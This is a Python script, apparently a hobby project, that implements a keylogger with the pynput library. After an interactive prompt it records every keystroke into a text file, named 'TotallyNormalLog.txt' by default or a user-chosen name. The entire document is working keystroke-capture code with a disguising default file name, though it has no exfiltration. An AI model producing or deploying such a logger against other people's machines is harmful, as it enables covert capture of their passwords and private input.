from pynput.keyboard import Listener as ltnr


def main():
        kll = input("Do you want to start the keylogger?(qs for quick start) y/n: ").lower()
        if kll =="qs":
                def file(key):
                        data = str(key)
                        f = open("TotallyNormalLog.txt","a")
                        f.write(data)
                        data = str(key)
                with ltnr(on_press=file) as i: 
                        i.join()       
        if kll == "y" or kll == "yes":
                file_name=input("Do you want to change the name of the log file? Default:'TotallyNormalLog' y/n: ").lower()
                if file_name == "y" or file_name == "yes":
                       name = input("Please enter a new name: ")
                       def file(key):
                        data = str(key)
                        f = open(f"{name}.txt","a")
                        f.write(data)
                        data = str(key)
                       with ltnr(on_press=file) as i:
                              i.join()
                else:
                       def file(key):
                        data = str(key)
                        f = open("TotallyNormalLog.txt","a")
                        f.write(data)
                        data = str(key)
                       with ltnr(on_press=file) as i:
                        i.join()                 
        else:
               print("Oh that's a shame.")
                
        


if __name__ == "__main__":
    main()
